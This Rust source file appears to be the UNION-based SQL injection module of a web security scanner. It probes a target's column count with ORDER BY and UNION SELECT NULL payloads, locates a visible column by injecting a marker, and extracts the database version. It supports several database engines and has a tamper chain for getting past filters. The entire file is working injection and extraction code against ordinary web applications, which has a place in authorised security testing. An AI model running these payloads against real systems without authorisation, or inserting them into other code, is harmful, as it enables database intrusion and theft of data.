//! UNION query-based SQL injection detection and data extraction.
//!
//! Determines column count via ORDER BY, finds visible columns via
//! marker injection, then extracts data through the visible column.

use std::sync::Arc;
use tokio::sync::Mutex;

use crate::error::Result;
use crate::fuzzer::param::FuzzTarget;
use crate::scan::ScanCtx;
use crate::target::Mark;

use super::{Confidence, SqliFinding, Technique};
use crate::sqli::config::SqliConfig;
use crate::sqli::dbms::Dbms;
use crate::sqli::detection;
use crate::sqli::payloads;
use crate::sqli::tamper::TamperChain;

/// Maximum columns to probe for ORDER BY detection.
const MAX_COLUMNS: usize = 50;

/// Run UNION query-based detection on all injection points.
pub async fn detect(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    config: &SqliConfig,
    tamper: &TamperChain,
) -> Result<Vec<SqliFinding>> {
    let mut findings = Vec::new();
    let (host, port, ssl) = {
        let m = mark.lock().await;
        (m.hostname.clone(), m.port, m.ssl)
    };

    let dbms_list = match config.dbms {
        Some(d) => vec![d],
        None => vec![
            Dbms::MySQL,
            Dbms::PostgreSQL,
            Dbms::MSSQL,
            Dbms::Oracle,
            Dbms::SQLite,
        ],
    };

    // Get baseline response for comparison
    let baseline_body = {
        let mut req = crate::http::request::Request::new(&host, port, &target.method, "/");
        req.uri = extract_path(&target.url);
        req.ssl = ssl;
        match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r.body,
            Err(_) => return Ok(findings),
        }
    };

    for (pi, point) in target.points.iter().enumerate() {
        if ctx.is_cancelled() {
            break;
        }

        for dbms in &dbms_list {
            if ctx.is_cancelled() {
                break;
            }

            // Step 1: Determine column count via ORDER BY
            let column_count = match detect_column_count(
                ctx,
                mark.clone(),
                target,
                pi,
                &baseline_body,
                tamper,
                config,
                &host,
                port,
                ssl,
            )
            .await?
            {
                Some(n) => n,
                None => continue, // Can't determine column count, try next DBMS
            };

            // Step 2: UNION NULL probe — confirm injection
            let union_works = test_union_null(
                ctx,
                mark.clone(),
                target,
                pi,
                *dbms,
                column_count,
                &baseline_body,
                tamper,
                config,
                &host,
                port,
                ssl,
            )
            .await?;

            if !union_works {
                continue;
            }

            // Step 3: Find visible column via marker injection
            let marker = detection::union_marker();
            let visible_col = find_visible_column(
                ctx,
                mark.clone(),
                target,
                pi,
                *dbms,
                column_count,
                &marker,
                tamper,
                config,
                &host,
                port,
                ssl,
            )
            .await?;

            // Step 4: Extract data
            let mut extracted = None;
            if let Some(vcol) = visible_col {
                extracted = extract_version(
                    ctx,
                    mark.clone(),
                    target,
                    pi,
                    *dbms,
                    column_count,
                    vcol,
                    &marker,
                    tamper,
                    config,
                    &host,
                    port,
                    ssl,
                )
                .await?;
            }

            findings.push(SqliFinding {
                technique: Technique::UnionQuery,
                dbms: *dbms,
                parameter: point.name().to_string(),
                injection_point: point.clone(),
                payload: format!(
                    "UNION SELECT ({} columns, visible: {:?})",
                    column_count, visible_col
                ),
                url: target.url.clone(),
                extracted_data: extracted,
                confidence: if visible_col.is_some() {
                    Confidence::High
                } else {
                    Confidence::Medium
                },
            });

            // Found for this point, skip remaining DBMS candidates
            break;
        }
    }

    Ok(findings)
}

/// Detect column count using ORDER BY probing.
async fn detect_column_count(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    baseline_body: &[u8],
    tamper: &TamperChain,
    config: &SqliConfig,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<usize>> {
    let probes = payloads::order_by_probes(MAX_COLUMNS);

    // Binary search for the maximum ORDER BY value
    let mut low = 1usize;
    let mut high = MAX_COLUMNS;
    let mut last_success = 0usize;

    // First check if ORDER BY 1 works at all
    let order_by_1 = format!("' {} --", probes[0].1);
    let tampered = if tamper.is_empty() {
        order_by_1
    } else {
        tamper.apply(&order_by_1, config.dbms)
    };

    let form = None;
    let mut req = target.inject(point_idx, &tampered, host, port, form);
    req.ssl = ssl;
    let resp = match ctx.nfetch(mark.clone(), &mut req).await {
        Ok(r) => r,
        Err(_) => return Ok(None),
    };

    // If ORDER BY 1 gives an error page, ORDER BY injection doesn't work
    let resp_ratio = detection::page_ratio(baseline_body, &resp.body);
    if resp_ratio < 0.5 {
        // Try direct column count probing with UNION SELECT NULL
        return detect_column_count_union(
            ctx, mark, target, point_idx, baseline_body, tamper, config, host, port, ssl,
        )
        .await;
    }

    // Binary search
    while low <= high {
        if ctx.is_cancelled() {
            break;
        }

        let mid = (low + high) / 2;
        let payload = format!("' ORDER BY {mid} --");
        let tampered_payload = if tamper.is_empty() {
            payload
        } else {
            tamper.apply(&payload, config.dbms)
        };

        let mut req = target.inject(point_idx, &tampered_payload, host, port, form);
        req.ssl = ssl;
        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => break,
        };

        let ratio = detection::page_ratio(baseline_body, &resp.body);
        if ratio >= 0.7 {
            last_success = mid;
            low = mid + 1;
        } else {
            if mid == 0 {
                break;
            }
            high = mid - 1;
        }
    }

    if last_success > 0 {
        Ok(Some(last_success))
    } else {
        Ok(None)
    }
}

/// Fallback column count detection using UNION SELECT NULL,NULL,...
async fn detect_column_count_union(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    baseline_body: &[u8],
    tamper: &TamperChain,
    config: &SqliConfig,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<usize>> {
    for n in 1..=20 {
        if ctx.is_cancelled() {
            break;
        }

        let nulls = vec!["NULL"; n].join(",");
        let payload = format!("' UNION ALL SELECT {nulls} --");
        let tampered = if tamper.is_empty() {
            payload
        } else {
            tamper.apply(&payload, config.dbms)
        };

        let form = None;
        let mut req = target.inject(point_idx, &tampered, host, port, form);
        req.ssl = ssl;
        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        // If page doesn't error out, we found the right column count
        let ratio = detection::page_ratio(baseline_body, &resp.body);
        if ratio >= 0.5 && !detection::has_generic_sql_error(&resp.body_str()) {
            return Ok(Some(n));
        }
    }

    Ok(None)
}

/// Test if UNION SELECT NULL works with the detected column count.
async fn test_union_null(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    column_count: usize,
    baseline_body: &[u8],
    tamper: &TamperChain,
    config: &SqliConfig,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<bool> {
    let from = dbms.from_dummy();
    let nulls = vec!["NULL"; column_count].join(",");
    let payload = format!("' UNION ALL SELECT {nulls}{from} --");
    let tampered = if tamper.is_empty() {
        payload
    } else {
        tamper.apply(&payload, config.dbms)
    };

    let form = None;
    let mut req = target.inject(point_idx, &tampered, host, port, form);
    req.ssl = ssl;
    let resp = match ctx.nfetch(mark.clone(), &mut req).await {
        Ok(r) => r,
        Err(_) => return Ok(false),
    };

    let ratio = detection::page_ratio(baseline_body, &resp.body);
    Ok(ratio >= 0.4 && !detection::has_generic_sql_error(&resp.body_str()))
}

/// Find which column position is visible in the response output.
async fn find_visible_column(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    column_count: usize,
    marker: &str,
    tamper: &TamperChain,
    config: &SqliConfig,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<usize>> {
    let marker_payloads = payloads::union_marker_payloads(dbms, column_count, marker);

    for (pos, union_payload) in &marker_payloads {
        if ctx.is_cancelled() {
            break;
        }

        let full = format!("' {union_payload} --");
        let tampered = if tamper.is_empty() {
            full
        } else {
            tamper.apply(&full, config.dbms)
        };

        let form = None;
        let mut req = target.inject(point_idx, &tampered, host, port, form);
        req.ssl = ssl;
        let resp = match ctx.nfetch(mark.clone(), &mut req).await {
            Ok(r) => r,
            Err(_) => continue,
        };

        if resp.body_str().contains(marker) {
            return Ok(Some(*pos));
        }
    }

    Ok(None)
}

/// Extract database version via the visible column.
async fn extract_version(
    ctx: &ScanCtx,
    mark: Arc<Mutex<Mark>>,
    target: &FuzzTarget,
    point_idx: usize,
    dbms: Dbms,
    column_count: usize,
    visible_col: usize,
    marker: &str,
    tamper: &TamperChain,
    config: &SqliConfig,
    host: &str,
    port: u16,
    ssl: bool,
) -> Result<Option<String>> {
    let version_fn = dbms.version_fn();
    let extract_payload = payloads::union_extract_payload(
        dbms,
        column_count,
        visible_col,
        version_fn,
        marker,
    );
    let full = format!("' {extract_payload} --");
    let tampered = if tamper.is_empty() {
        full
    } else {
        tamper.apply(&full, config.dbms)
    };

    let form = None;
    let mut req = target.inject(point_idx, &tampered, host, port, form);
    req.ssl = ssl;
    let resp = match ctx.nfetch(mark.clone(), &mut req).await {
        Ok(r) => r,
        Err(_) => return Ok(None),
    };

    Ok(detection::extract_data_from_union(&resp.body_str(), marker))
}

fn extract_path(url: &str) -> String {
    url::Url::parse(url)
        .map(|u| {
            let mut s = u.path().to_string();
            if let Some(q) = u.query() {
                s.push('?');
                s.push_str(q);
            }
            s
        })
        .unwrap_or_else(|_| "/".to_string())
}
